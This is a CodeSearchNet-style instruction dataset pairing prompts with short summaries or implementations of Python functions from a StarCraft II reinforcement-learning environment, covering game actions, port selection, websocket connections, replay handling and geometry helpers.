{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ability(cls, id_, name, function_type, ability_id, general_id=0):\n    assert function_type in ABILITY_FUNCTIONS\n    return cls(id_, name, ability_id, general_id, function_type,\n               FUNCTION_TYPES[function_type], None)", "response": "Define a function represented as a game ability."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nstring version of the object.", "response": "def str(self, space=False):\n    \"\"\"String version. Set space=True to line them all up nicely.\"\"\"\n    return \"%s/%s (%s)\" % (str(int(self.id)).rjust(space and 4),\n                           self.name.ljust(space and 50),\n                           \"; \".join(str(a) for a in self.args))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ninitializes a new FunctionCall instance with some validation for the function and arguments.", "response": "def init_with_validation(cls, function, arguments):\n    \"\"\"Return a `FunctionCall` given some validation for the function and args.\n\n    Args:\n      function: A function name or id, to be converted into a function id enum.\n      arguments: An iterable of function arguments. Arguments that are enum\n          types can be passed by name. Arguments that only take one value (ie\n          not a point) don't need to be wrapped in a list.\n\n    Returns:\n      A new `FunctionCall` instance.\n\n    Raises:\n      KeyError: if the enum name doesn't exist.\n      ValueError: if the enum id doesn't exist.\n    \"\"\"\n    func = FUNCTIONS[function]\n    args = []\n    for arg, arg_type in zip(arguments, func.args):\n      if arg_type.values:  # Allow enum values by name or int.\n        if isinstance(arg, six.string_types):\n          try:\n            args.append([arg_type.values[arg]])\n          except KeyError:\n            raise KeyError(\"Unknown argument value: %s, valid values: %s\" % (\n                arg, [v.name for v in arg_type.values]))\n        else:\n          if isinstance(arg, (list, tuple)):\n            arg = arg[0]\n          try:\n            args.append([arg_type.values(arg)])\n          except ValueError:\n            raise ValueError(\"Unknown argument value: %s, valid values: %s\" % (\n                arg, list(arg_type.values)))\n      elif isinstance(arg, int):  # Allow bare ints.\n        args.append([arg])\n      else:  # Allow tuples or iterators.\n        args.append(list(arg))\n    return cls(func.id, args)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nprinting the valid actions.", "response": "def main(unused_argv):\n  \"\"\"Print the valid actions.\"\"\"\n  feats = features.Features(\n      # Actually irrelevant whether it's feature or rgb size.\n      features.AgentInterfaceFormat(\n          feature_dimensions=features.Dimensions(\n              screen=FLAGS.screen_size,\n              minimap=FLAGS.minimap_size)))\n  action_spec = feats.action_spec()\n  flattened = 0\n  count = 0\n  for func in action_spec.functions:\n    if FLAGS.hide_specific and actions.FUNCTIONS[func.id].general_id != 0:\n      continue\n    count += 1\n    act_flat = 1\n    for arg in func.args:\n      for size in arg.sizes:\n        act_flat *= size\n    flattened += act_flat\n    print(func.str(True))\n  print(\"Total base actions:\", count)\n  print(\"Total possible actions (flattened):\", flattened)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef pick_unused_ports(num_ports, retry_interval_secs=3, retry_attempts=5):\n  ports = set()\n  for _ in range(retry_attempts):\n    ports.update(\n        portpicker.pick_unused_port() for _ in range(num_ports - len(ports)))\n    ports.discard(None)  # portpicker returns None on error.\n    if len(ports) == num_ports:\n      return list(ports)\n    # Duplicate ports can be returned, especially when insufficient ports are\n    # free. Wait for more ports to be freed and retry.\n    time.sleep(retry_interval_secs)\n\n  # Could not obtain enough ports. Release what we do have.\n  return_ports(ports)\n\n  raise RuntimeError(\"Unable to obtain %d unused ports.\" % num_ports)", "response": "Reserves and returns a list of num_ports unused ports."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreserving and returns a list of num_ports contiguous unused ports.", "response": "def pick_contiguous_unused_ports(\n    num_ports,\n    retry_interval_secs=3,\n    retry_attempts=5):\n  \"\"\"Reserves and returns a list of `num_ports` contiguous unused ports.\"\"\"\n  for _ in range(retry_attempts):\n    start_port = portpicker.pick_unused_port()\n    if start_port is not None:\n      ports = [start_port + p for p in range(num_ports)]\n      if all(portpicker.is_port_free(p) for p in ports):\n        return ports\n      else:\n        return_ports(ports)\n\n    time.sleep(retry_interval_secs)\n\n  raise RuntimeError(\"Unable to obtain %d contiguous unused ports.\" % num_ports)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef run_thread(agent_classes, players, map_name, visualize):\n  with sc2_env.SC2Env(\n      map_name=map_name,\n      players=players,\n      agent_interface_format=sc2_env.parse_agent_interface_format(\n          feature_screen=FLAGS.feature_screen_size,\n          feature_minimap=FLAGS.feature_minimap_size,\n          rgb_screen=FLAGS.rgb_screen_size,\n          rgb_minimap=FLAGS.rgb_minimap_size,\n          action_space=FLAGS.action_space,\n          use_feature_units=FLAGS.use_feature_units),\n      step_mul=FLAGS.step_mul,\n      game_steps_per_episode=FLAGS.game_steps_per_episode,\n      disable_fog=FLAGS.disable_fog,\n      visualize=visualize) as env:\n    env = available_actions_printer.AvailableActionsPrinter(env)\n    agents = [agent_cls() for agent_cls in agent_classes]\n    run_loop.run_loop(agents, env, FLAGS.max_agent_steps, FLAGS.max_episodes)\n    if FLAGS.save_replay:\n      env.save_replay(agent_classes[0].__name__)", "response": "Runs one thread worth of the environment with agents."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef check_error(res, error_enum):\n  if res.HasField(\"error\"):\n    enum_name = error_enum.DESCRIPTOR.full_name\n    error_name = error_enum.Name(res.error)\n    details = getattr(res, \"error_details\", \"<none>\")\n    raise RequestError(\"%s.%s: '%s'\" % (enum_name, error_name, details), res)\n  return res", "response": "Raise if the result has an error otherwise return the result."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef decorate_check_error(error_enum):\n  def decorator(func):\n    @functools.wraps(func)\n    def _check_error(*args, **kwargs):\n      return check_error(func(*args, **kwargs), error_enum)\n    return _check_error\n  return decorator", "response": "Decorator to call check_error on the return value."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef catch_game_end(func):\n  @functools.wraps(func)\n  def _catch_game_end(self, *args, **kwargs):\n    \"\"\"Decorator to handle 'Game has already ended' exceptions.\"\"\"\n    prev_status = self.status\n    try:\n      return func(self, *args, **kwargs)\n    except protocol.ProtocolError as protocol_error:\n      if prev_status == Status.in_game and (\n          \"Game has already ended\" in str(protocol_error)):\n        # It's currently possible for us to receive this error even though\n        # our previous status was in_game. This shouldn't happen according\n        # to the protocol. It does happen sometimes when we don't observe on\n        # every step (possibly also requiring us to be playing against a\n        # built-in bot). To work around the issue, we catch the exception\n        # and so let the client code continue.\n        logging.warning(\n            \"Received a 'Game has already ended' error from SC2 whilst status \"\n            \"in_game. Suppressing the exception, returning None.\")\n\n        return None\n      else:\n        raise\n\n  return _catch_game_end", "response": "Decorator to catch Game has already ended exceptions."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconnecting to the SC2 websocket.", "response": "def _connect(self, host, port, proc, timeout_seconds):\n    \"\"\"Connect to the websocket, retrying as needed. Returns the socket.\"\"\"\n    if \":\" in host and not host.startswith(\"[\"):  # Support ipv6 addresses.\n      host = \"[%s]\" % host\n    url = \"ws://%s:%s/sc2api\" % (host, port)\n\n    was_running = False\n    for i in range(timeout_seconds):\n      is_running = proc and proc.running\n      was_running = was_running or is_running\n      if (i >= timeout_seconds // 4 or was_running) and not is_running:\n        logging.warning(\n            \"SC2 isn't running, so bailing early on the websocket connection.\")\n        break\n      logging.info(\"Connecting to: %s, attempt: %s, running: %s\", url, i,\n                   is_running)\n      try:\n        return websocket.create_connection(url, timeout=timeout_seconds)\n      except socket.error:\n        pass  # SC2 hasn't started listening yet.\n      except websocket.WebSocketBadStatusException as err:\n        if err.status_code == 404:\n          pass  # SC2 is listening, but hasn't set up the /sc2api endpoint yet.\n        else:\n          raise\n      time.sleep(1)\n    raise ConnectError(\"Failed to connect to the SC2 websocket. Is it up?\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsave a map into temp dir so create game can access it in multiplayer.", "response": "def save_map(self, map_path, map_data):\n    \"\"\"Save a map into temp dir so create game can access it in multiplayer.\"\"\"\n    return self._client.send(save_map=sc_pb.RequestSaveMap(\n        map_path=map_path, map_data=map_data))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef data_raw(self):\n    return self._client.send(data=sc_pb.RequestData(\n        ability_id=True, unit_type_id=True))", "response": "Get the raw static data for the current game. Prefer data instead."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsteps the engine forward by one step.", "response": "def step(self, count=1):\n    \"\"\"Step the engine forward by one (or more) step.\"\"\"\n    return self._client.send(step=sc_pb.RequestStep(count=count))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsends a sc_pb. RequestAction which may include multiple actions.", "response": "def actions(self, req_action):\n    \"\"\"Send a `sc_pb.RequestAction`, which may include multiple actions.\"\"\"\n    if FLAGS.sc2_log_actions:\n      for action in req_action.actions:\n        sys.stderr.write(str(action))\n        sys.stderr.flush()\n\n    return self._client.send(action=req_action)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef act(self, action):\n    if action and action.ListFields():  # Skip no-ops.\n      return self.actions(sc_pb.RequestAction(actions=[action]))", "response": "Send a single action. This is a shortcut for actions."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef chat(self, message):\n    if message:\n      action_chat = sc_pb.ActionChat(\n          channel=sc_pb.ActionChat.Broadcast, message=message)\n      action = sc_pb.Action(action_chat=action_chat)\n      return self.act(action)", "response": "Send chat message as a broadcast."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef save_replay(self):\n    res = self._client.send(save_replay=sc_pb.RequestSaveReplay())\n    return res.data", "response": "Save a replay returning the data."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nrun a debug command.", "response": "def debug(self, debug_commands):\n    \"\"\"Run a debug command.\"\"\"\n    if isinstance(debug_commands, sc_debug.DebugCommand):\n      debug_commands = [debug_commands]\n    return self._client.send(debug=sc_pb.RequestDebug(debug=debug_commands))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nshuts down the SC2 process.", "response": "def quit(self):\n    \"\"\"Shut down the SC2 process.\"\"\"\n    try:\n      # Don't expect a response.\n      self._client.write(sc_pb.Request(quit=sc_pb.RequestQuit()))\n    except protocol.ConnectionError:\n      pass  # It's likely already (shutting) down, so continue as if it worked.\n    finally:\n      self.close()"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the map data for a map by name or path.", "response": "def map_data(self, map_name):\n    \"\"\"Return the map data for a map by name or path.\"\"\"\n    with gfile.Open(os.path.join(self.data_dir, \"Maps\", map_name), \"rb\") as f:\n      return f.read()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef replay_data(self, replay_path):\n    with gfile.Open(self.abs_replay_path(replay_path), \"rb\") as f:\n      return f.read()", "response": "Return the replay data given a path to the replay."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef replay_paths(self, replay_dir):\n    replay_dir = self.abs_replay_path(replay_dir)\n    if replay_dir.lower().endswith(\".sc2replay\"):\n      yield replay_dir\n      return\n    for f in gfile.ListDir(replay_dir):\n      if f.lower().endswith(\".sc2replay\"):\n        yield os.path.join(replay_dir, f)", "response": "A generator yielding the full path to the replays under replay_dir."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsave a replay to a directory.", "response": "def save_replay(self, replay_data, replay_dir, prefix=None):\n    \"\"\"Save a replay to a directory, returning the path to the replay.\n\n    Args:\n      replay_data: The result of controller.save_replay(), ie the binary data.\n      replay_dir: Where to save the replay. This can be absolute or relative.\n      prefix: Optional prefix for the replay filename.\n\n    Returns:\n      The full path where the replay is saved.\n\n    Raises:\n      ValueError: If the prefix contains the path seperator.\n    \"\"\"\n    if not prefix:\n      replay_filename = \"\"\n    elif os.path.sep in prefix:\n      raise ValueError(\"Prefix '%s' contains '%s', use replay_dir instead.\" % (\n          prefix, os.path.sep))\n    else:\n      replay_filename = prefix + \"_\"\n    now = datetime.datetime.utcnow().replace(microsecond=0)\n    replay_filename += \"%s.SC2Replay\" % now.isoformat(\"-\").replace(\":\", \"-\")\n    replay_dir = self.abs_replay_path(replay_dir)\n    if not gfile.Exists(replay_dir):\n      gfile.MakeDirs(replay_dir)\n    replay_path = os.path.join(replay_dir, replay_filename)\n    with gfile.Open(replay_path, \"wb\") as f:\n      f.write(replay_data)\n    return replay_path"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef all_subclasses(cls):\n    for s in cls.__subclasses__():\n      yield s\n      for c in s.all_subclasses():\n        yield c", "response": "An iterator over all subclasses of cls."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _indices(self, indices):\n    if isinstance(indices, tuple):\n      out = []\n      dim = 0\n      for i, index in enumerate(indices):\n        if index is Ellipsis:\n          out.append(index)\n          dim = len(self.shape) - len(indices) + i\n        else:\n          out.append(self._get_index(dim, index))\n        dim += 1\n      return tuple(out)\n    else:\n      return self._get_index(0, indices)", "response": "Turn all string indices into int indices preserving ellipsis."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_index(self, dim, index):\n    if isinstance(index, six.string_types):\n      try:\n        return self._index_names[dim][index]\n      except KeyError:\n        raise KeyError(\"Name '%s' is invalid for axis %s.\" % (index, dim))\n      except TypeError:\n        raise TypeError(\n            \"Trying to access an unnamed axis %s by name: '%s'\" % (dim, index))\n    else:\n      return index", "response": "Turn a string into a real index otherwise return the index."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef assign_to(self, obj):\n    obj.x = self.x\n    obj.y = self.y", "response": "Assign x and y to an object that has properties x and y."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef dist(self, other):\n    dx = self.x - other.x\n    dy = self.y - other.y\n    return math.sqrt(dx**2 + dy**2)", "response": "Distance to some other point."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef dist_sq(self, other):\n    dx = self.x - other.x\n    dy = self.y - other.y\n    return dx**2 + dy**2", "response": "Distance squared to some other point."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef round(self):\n    return Point(int(round(self.x)), int(round(self.y)))", "response": "Round x and y to integers."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef floor(self):\n    return Point(int(math.floor(self.x)), int(math.floor(self.y)))", "response": "Round x and y down to integers."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef ceil(self):\n    return Point(int(math.ceil(self.x)), int(math.ceil(self.y)))", "response": "Round x and y up to integers."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbind this point within the rect defined by p1 and p2.", "response": "def bound(self, p1, p2=None):\n    \"\"\"Bound this point within the rect defined by (`p1`, `p2`).\"\"\"\n    r = Rect(p1, p2)\n    return Point(min(max(self.x, r.l), r.r), min(max(self.y, r.t), r.b))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef contains_point(self, pt):\n    return (self.l < pt.x and self.r > pt.x and\n            self.t < pt.y and self.b > pt.y)", "response": "Is the point inside this rect?"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nam the circle completely inside this rect?", "response": "def contains_circle(self, pt, radius):\n    \"\"\"Is the circle completely inside this rect?\"\"\"\n    return (self.l < pt.x - radius and self.r > pt.x + radius and\n            self.t < pt.y - radius and self.b > pt.y + radius)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning True if the circle intersects with this rect.", "response": "def intersects_circle(self, pt, radius):\n    \"\"\"Does the circle intersect with this rect?\"\"\"\n    # How this works: http://stackoverflow.com/a/402010\n    rect_corner = self.size / 2  # relative to the rect center\n    circle_center = (pt - self.center).abs()  # relative to the rect center\n\n    # Is the circle far from the rect?\n    if (circle_center.x > rect_corner.x + radius or\n        circle_center.y > rect_corner.y + radius):\n      return False\n\n    # Is the circle center inside the rect or near one of the edges?\n    if (circle_center.x <= rect_corner.x or\n        circle_center.y <= rect_corner.y):\n      return True\n\n    # Does the circle contain the corner of the rect?\n    return circle_center.dist_sq(rect_corner) <= radius**2"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _read_execute_info(path, parents):\n  path = os.path.join(path, \"StarCraft II/ExecuteInfo.txt\")\n  if os.path.exists(path):\n    with open(path, \"rb\") as f:  # Binary because the game appends a '\\0' :(.\n      for line in f:\n        parts = [p.strip() for p in line.decode(\"utf-8\").split(\"=\")]\n        if len(parts) == 2 and parts[0] == \"executable\":\n          exec_path = parts[1].replace(\"\\\\\", \"/\")  # For windows compatibility.\n          for _ in range(parents):\n            exec_path = os.path.dirname(exec_path)\n          return exec_path", "response": "Read the ExecuteInfo. txt file and return the base directory."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a game for the agents to join.", "response": "def create_game(self, map_name):\n    \"\"\"Create a game for the agents to join.\n\n    Args:\n      map_name: The map to use.\n    \"\"\"\n    map_inst = maps.get(map_name)\n    map_data = map_inst.data(self._run_config)\n    if map_name not in self._saved_maps:\n      for controller in self._controllers:\n        controller.save_map(map_inst.path, map_data)\n      self._saved_maps.add(map_name)\n\n    # Form the create game message.\n    create = sc_pb.RequestCreateGame(\n        local_map=sc_pb.LocalMap(map_path=map_inst.path),\n        disable_fog=False)\n\n    # Set up for two agents.\n    for _ in range(self._num_agents):\n      create.player_setup.add(type=sc_pb.Participant)\n\n    # Create the game.\n    self._controllers[0].create_game(create)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef close(self):\n    for controller in self._controllers:\n      controller.quit()\n    self._controllers = []\n\n    for process in self._processes:\n      process.close()\n    self._processes = []\n\n    portspicker.return_ports(self._lan_ports)\n    self._lan_ports = []", "response": "Shutdown and free all resources."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create_game(\n      self,\n      map_name,\n      bot_difficulty=sc_pb.VeryEasy,\n      bot_race=sc_common.Random,\n      bot_first=False):\n    \"\"\"Create a game, one remote agent vs the specified bot.\n\n    Args:\n      map_name: The map to use.\n      bot_difficulty: The difficulty of the bot to play against.\n      bot_race: The race for the bot.\n      bot_first: Whether the bot should be player 1 (else is player 2).\n    \"\"\"\n    self._controller.ping()\n\n    # Form the create game message.\n    map_inst = maps.get(map_name)\n    map_data = map_inst.data(self._run_config)\n    if map_name not in self._saved_maps:\n      self._controller.save_map(map_inst.path, map_data)\n      self._saved_maps.add(map_name)\n\n    create = sc_pb.RequestCreateGame(\n        local_map=sc_pb.LocalMap(map_path=map_inst.path, map_data=map_data),\n        disable_fog=False)\n\n    # Set up for one bot, one agent.\n    if not bot_first:\n      create.player_setup.add(type=sc_pb.Participant)\n\n    create.player_setup.add(\n        type=sc_pb.Computer, race=bot_race, difficulty=bot_difficulty)\n\n    if bot_first:\n      create.player_setup.add(type=sc_pb.Participant)\n\n    # Create the game.\n    self._controller.create_game(create)", "response": "Create a game for one remote agent vs the specified bot."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef agent():\n  agent_module, agent_name = FLAGS.agent.rsplit(\".\", 1)\n  agent_cls = getattr(importlib.import_module(agent_module), agent_name)\n\n  logging.info(\"Starting agent:\")\n  with lan_sc2_env.LanSC2Env(\n      host=FLAGS.host,\n      config_port=FLAGS.config_port,\n      race=sc2_env.Race[FLAGS.agent_race],\n      step_mul=FLAGS.step_mul,\n      agent_interface_format=sc2_env.parse_agent_interface_format(\n          feature_screen=FLAGS.feature_screen_size,\n          feature_minimap=FLAGS.feature_minimap_size,\n          rgb_screen=FLAGS.rgb_screen_size,\n          rgb_minimap=FLAGS.rgb_minimap_size,\n          action_space=FLAGS.action_space,\n          use_feature_units=FLAGS.use_feature_units),\n      visualize=FLAGS.render) as env:\n    agents = [agent_cls()]\n    logging.info(\"Connected, starting run_loop.\")\n    try:\n      run_loop.run_loop(agents, env)\n    except lan_sc2_env.RestartException:\n      pass\n  logging.info(\"Done.\")", "response": "Run the agent connecting to a remote host."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef human():\n  run_config = run_configs.get()\n\n  map_inst = maps.get(FLAGS.map)\n\n  if not FLAGS.rgb_screen_size or not FLAGS.rgb_minimap_size:\n    logging.info(\"Use --rgb_screen_size and --rgb_minimap_size if you want rgb \"\n                 \"observations.\")\n\n  ports = [FLAGS.config_port + p for p in range(5)]  # tcp + 2 * num_players\n  if not all(portpicker.is_port_free(p) for p in ports):\n    sys.exit(\"Need 5 free ports after the config port.\")\n\n  proc = None\n  ssh_proc = None\n  tcp_conn = None\n  udp_sock = None\n  try:\n    proc = run_config.start(extra_ports=ports[1:], timeout_seconds=300,\n                            host=FLAGS.host, window_loc=(50, 50))\n\n    tcp_port = ports[0]\n    settings = {\n        \"remote\": FLAGS.remote,\n        \"game_version\": proc.version.game_version,\n        \"realtime\": FLAGS.realtime,\n        \"map_name\": map_inst.name,\n        \"map_path\": map_inst.path,\n        \"map_data\": map_inst.data(run_config),\n        \"ports\": {\n            \"server\": {\"game\": ports[1], \"base\": ports[2]},\n            \"client\": {\"game\": ports[3], \"base\": ports[4]},\n        }\n    }\n\n    create = sc_pb.RequestCreateGame(\n        realtime=settings[\"realtime\"],\n        local_map=sc_pb.LocalMap(map_path=settings[\"map_path\"]))\n    create.player_setup.add(type=sc_pb.Participant)\n    create.player_setup.add(type=sc_pb.Participant)\n\n    controller = proc.controller\n    controller.save_map(settings[\"map_path\"], settings[\"map_data\"])\n    controller.create_game(create)\n\n    if FLAGS.remote:\n      ssh_proc = lan_sc2_env.forward_ports(\n          FLAGS.remote, proc.host, [settings[\"ports\"][\"client\"][\"base\"]],\n          [tcp_port, settings[\"ports\"][\"server\"][\"base\"]])\n\n    print(\"-\" * 80)\n    print(\"Join: play_vs_agent --host %s --config_port %s\" % (proc.host,\n                                                              tcp_port))\n    print(\"-\" * 80)\n\n    tcp_conn = lan_sc2_env.tcp_server(\n        lan_sc2_env.Addr(proc.host, tcp_port), settings)\n\n    if FLAGS.remote:\n      udp_sock = lan_sc2_env.udp_server(\n          lan_sc2_env.Addr(proc.host, settings[\"ports\"][\"client\"][\"game\"]))\n\n      lan_sc2_env.daemon_thread(\n          lan_sc2_env.tcp_to_udp,\n          (tcp_conn, udp_sock,\n           lan_sc2_env.Addr(proc.host, settings[\"ports\"][\"server\"][\"game\"])))\n\n      lan_sc2_env.daemon_thread(lan_sc2_env.udp_to_tcp, (udp_sock, tcp_conn))\n\n    join = sc_pb.RequestJoinGame()\n    join.shared_port = 0  # unused\n    join.server_ports.game_port = settings[\"ports\"][\"server\"][\"game\"]\n    join.server_ports.base_port = settings[\"ports\"][\"server\"][\"base\"]\n    join.client_ports.add(game_port=settings[\"ports\"][\"client\"][\"game\"],\n                          base_port=settings[\"ports\"][\"client\"][\"base\"])\n\n    join.race = sc2_env.Race[FLAGS.user_race]\n    join.player_name = FLAGS.user_name\n    if FLAGS.render:\n      join.options.raw = True\n      join.options.score = True\n      if FLAGS.feature_screen_size and FLAGS.feature_minimap_size:\n        fl = join.options.feature_layer\n        fl.width = 24\n        FLAGS.feature_screen_size.assign_to(fl.resolution)\n        FLAGS.feature_minimap_size.assign_to(fl.minimap_resolution)\n      if FLAGS.rgb_screen_size and FLAGS.rgb_minimap_size:\n        FLAGS.rgb_screen_size.assign_to(join.options.render.resolution)\n        FLAGS.rgb_minimap_size.assign_to(join.options.render.minimap_resolution)\n    controller.join_game(join)\n\n    if FLAGS.render:\n      renderer = renderer_human.RendererHuman(\n          fps=FLAGS.fps, render_feature_grid=False)\n      renderer.run(run_configs.get(), controller, max_episodes=1)\n    else:  # Still step forward so the Mac/Windows renderer works.\n      while True:\n        frame_start_time = time.time()\n        if not FLAGS.realtime:\n          controller.step()\n        obs = controller.observe()\n\n        if obs.player_result:\n          break\n        time.sleep(max(0, frame_start_time - time.time() + 1 / FLAGS.fps))\n  except KeyboardInterrupt:\n    pass\n  finally:\n    if tcp_conn:\n      tcp_conn.close()\n    if proc:\n      proc.close()\n    if udp_sock:\n      udp_sock.close()\n    if ssh_proc:\n      ssh_proc.terminate()\n      for _ in range(5):\n        if ssh_proc.poll() is not None:\n          break\n        time.sleep(1)\n      if ssh_proc.poll() is None:\n        ssh_proc.kill()\n        ssh_proc.wait()", "response": "Run a host which expects one player to connect remotely."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconnects to the remote controller.", "response": "def _connect_remote(self, host, host_port, lan_ports, race, name, map_inst,\n                      save_map, interface):\n    \"\"\"Make sure this stays synced with bin/agent_remote.py.\"\"\"\n    # Connect!\n    logging.info(\"Connecting...\")\n    self._controllers = [remote_controller.RemoteController(host, host_port)]\n    logging.info(\"Connected\")\n\n    if map_inst and save_map:\n      run_config = run_configs.get()\n      self._controllers[0].save_map(map_inst.path, map_inst.data(run_config))\n\n    # Create the join request.\n    join = sc_pb.RequestJoinGame(options=interface)\n    join.race = race\n    join.player_name = name\n    join.shared_port = 0  # unused\n    join.server_ports.game_port = lan_ports.pop(0)\n    join.server_ports.base_port = lan_ports.pop(0)\n    join.client_ports.add(\n        game_port=lan_ports.pop(0), base_port=lan_ports.pop(0))\n\n    logging.info(\"Joining game.\")\n    self._controllers[0].join_game(join)\n    self._in_game = True\n    logging.info(\"Game joined.\")"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the config chosen by the flags.", "response": "def get():\n  \"\"\"Get the config chosen by the flags.\"\"\"\n  configs = {c.name(): c\n             for c in lib.RunConfig.all_subclasses() if c.priority()}\n\n  if not configs:\n    raise sc_process.SC2LaunchError(\"No valid run_configs found.\")\n\n  if FLAGS.sc2_run_config is None:  # Find the highest priority as default.\n    return max(configs.values(), key=lambda c: c.priority())()\n\n  try:\n    return configs[FLAGS.sc2_run_config]()\n  except KeyError:\n    raise sc_process.SC2LaunchError(\n        \"Invalid run_config. Valid configs are: %s\" % (\n            \", \".join(sorted(configs.keys()))))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef reset(self):\n    self._episode_steps = 0\n    if self._episode_count:\n      # No need to restart for the first episode.\n      self._restart()\n\n    self._episode_count += 1\n    logging.info(\"Starting episode: %s\", self._episode_count)\n    self._metrics.increment_episode()\n\n    self._last_score = [0] * self._num_agents\n    self._state = environment.StepType.FIRST\n    if self._realtime:\n      self._last_step_time = time.time()\n      self._target_step = 0\n\n    return self._observe()", "response": "Start a new episode."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef step(self, actions, step_mul=None):\n    if self._state == environment.StepType.LAST:\n      return self.reset()\n\n    skip = not self._ensure_available_actions\n    self._parallel.run(\n        (c.act, f.transform_action(o.observation, a, skip_available=skip))\n        for c, f, o, a in zip(\n            self._controllers, self._features, self._obs, actions))\n\n    self._state = environment.StepType.MID\n    return self._step(step_mul)", "response": "Apply actions step the world forward and return observations."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsend a list of messages to the chat.", "response": "def send_chat_messages(self, messages):\n    \"\"\"Useful for logging messages into the replay.\"\"\"\n    self._parallel.run(\n        (c.chat, message) for c, message in zip(self._controllers, messages))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef valid_replay(info, ping):\n  if (info.HasField(\"error\") or\n      info.base_build != ping.base_build or  # different game version\n      info.game_duration_loops < 1000 or\n      len(info.player_info) != 2):\n    # Probably corrupt, or just not interesting.\n    return False\n  for p in info.player_info:\n    if p.player_apm < 10 or p.player_mmr < 1000:\n      # Low APM = player just standing around.\n      # Low MMR = corrupt replay or player who is weak.\n      return False\n  return True", "response": "Make sure the replay isn t corrupt and is worth looking at."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef main(unused_argv):\n  run_config = run_configs.get()\n\n  if not gfile.Exists(FLAGS.replays):\n    sys.exit(\"{} doesn't exist.\".format(FLAGS.replays))\n\n  stats_queue = multiprocessing.Queue()\n  stats_thread = threading.Thread(target=stats_printer, args=(stats_queue,))\n  stats_thread.start()\n  try:\n    # For some reason buffering everything into a JoinableQueue makes the\n    # program not exit, so save it into a list then slowly fill it into the\n    # queue in a separate thread. Grab the list synchronously so we know there\n    # is work in the queue before the SC2 processes actually run, otherwise\n    # The replay_queue.join below succeeds without doing any work, and exits.\n    print(\"Getting replay list:\", FLAGS.replays)\n    replay_list = sorted(run_config.replay_paths(FLAGS.replays))\n    print(len(replay_list), \"replays found.\\n\")\n    replay_queue = multiprocessing.JoinableQueue(FLAGS.parallel * 10)\n    replay_queue_thread = threading.Thread(target=replay_queue_filler,\n                                           args=(replay_queue, replay_list))\n    replay_queue_thread.daemon = True\n    replay_queue_thread.start()\n\n    for i in range(FLAGS.parallel):\n      p = ReplayProcessor(i, run_config, replay_queue, stats_queue)\n      p.daemon = True\n      p.start()\n      time.sleep(1)  # Stagger startups, otherwise they seem to conflict somehow\n\n    replay_queue.join()  # Wait for the queue to empty.\n  except KeyboardInterrupt:\n    print(\"Caught KeyboardInterrupt, exiting.\")\n  finally:\n    stats_queue.put(None)  # Tell the stats_thread to print and exit.\n    stats_thread.join()", "response": "Dump stats about all the actions that are in use in a set of replays."}
